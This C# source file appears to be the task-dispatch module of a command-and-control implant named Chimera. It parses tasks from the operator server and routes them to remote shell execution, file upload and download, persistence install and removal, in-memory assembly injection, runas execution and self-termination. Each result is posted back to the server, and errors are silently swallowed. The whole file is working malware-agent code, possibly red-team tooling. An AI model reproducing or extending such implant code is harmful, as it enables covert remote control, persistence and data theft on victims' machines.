using System;

namespace Chimera
{
    public static class Tasking
    {
        public static string CallbackUUID = "";

        public static bool ParseCheckinResponse(string json)
        {
            try
            {
                if (json == null) return false;
                string id = ExtractJsonValue(json, "id");
                if (!string.IsNullOrEmpty(id))
                {
                    CallbackUUID = id;
                    return true;
                }
                return false;
            }
            catch { return false; }
        }

        public static void Dispatch(string json)
        {
            try
            {
                if (json == null) return;

                int tasksStart = json.IndexOf("\"tasks\":");
                if (tasksStart == -1) return;

                int arrStart = json.IndexOf("[", tasksStart);
                int arrEnd   = json.IndexOf("]", arrStart);
                if (arrEnd - arrStart <= 1) return;

                string tasksContent = json.Substring(arrStart + 1, arrEnd - arrStart - 1).Trim();
                if (tasksContent.Length == 0) return;

                string taskID     = ExtractJsonValue(tasksContent, "id");
                string command    = ExtractJsonValue(tasksContent, "command");
                string parameters = ExtractJsonValue(tasksContent, "parameters");

                if (string.IsNullOrEmpty(taskID) || string.IsNullOrEmpty(command))
                    return;

                string output = "";

                switch (command.ToLower())
                {
                    case "shell":
                        output = Commands.Shell.Execute(parameters);
                        break;

                    case "upload":
                        output = Commands.Upload.Execute(parameters, taskID, CallbackUUID);
                        break;

                    case "download":
                        output = Commands.Download.Execute(parameters, taskID, CallbackUUID);
                        break;

                    case "ls":
                        output = Commands.Ls.Execute(parameters);
                        break;

                    case "pwd":
                        output = Commands.Pwd.Execute();
                        break;

                    case "cd":
                        output = Commands.Cd.Execute(parameters);
                        break;

                    case "sleep":
                        output = Commands.Sleep.Execute(parameters);
                        break;

                    case "persist":
                        output = parameters != null && parameters.ToLower() == "remove"
                            ? Commands.Persist.Remove()
                            : Commands.Persist.Execute();
                        break;

                    case "inject_assembly":
                        output = Commands.InjectAssembly.Execute(parameters);
                        break;

                    case "runas_exec":
                        output = Commands.RunasExec.Execute(parameters);
                        break;

                    case "help":
                        output = Commands.Help.Execute();
                        break;

                    case "kill":
                        output = Commands.Kill.Execute();
                        C2Http.PostResponse(CallbackUUID, taskID, "Agent terminating.");
                        if (output == "__KILL__")
                            Environment.Exit(0);
                        return;

                    default:
                        output = $"Unknown command: {command}";
                        break;
                }

                C2Http.PostResponse(CallbackUUID, taskID, output);
            }
            catch { }
        }

        public static string ExtractJsonValue(string json, string key)
        {
            try
            {
                string search = $"\"{key}\":";
                int keyIdx = json.IndexOf(search);
                if (keyIdx == -1) return null;

                int valueStart = keyIdx + search.Length;
                while (valueStart < json.Length && json[valueStart] == ' ')
                    valueStart++;

                if (valueStart >= json.Length) return null;

                if (json[valueStart] == '"')
                {
                    valueStart++;
                    int valueEnd = valueStart;
                    while (valueEnd < json.Length)
                    {
                        if (json[valueEnd] == '"' && json[valueEnd - 1] != '\\')
                            break;
                        valueEnd++;
                    }
                    return json.Substring(valueStart, valueEnd - valueStart);
                }
                else
                {
                    int valueEnd = valueStart;
                    while (valueEnd < json.Length &&
                           json[valueEnd] != ',' &&
                           json[valueEnd] != '}' &&
                           json[valueEnd] != ']')
                        valueEnd++;
                    return json.Substring(valueStart, valueEnd - valueStart).Trim();
                }
            }
            catch { return null; }
        }
    }
}
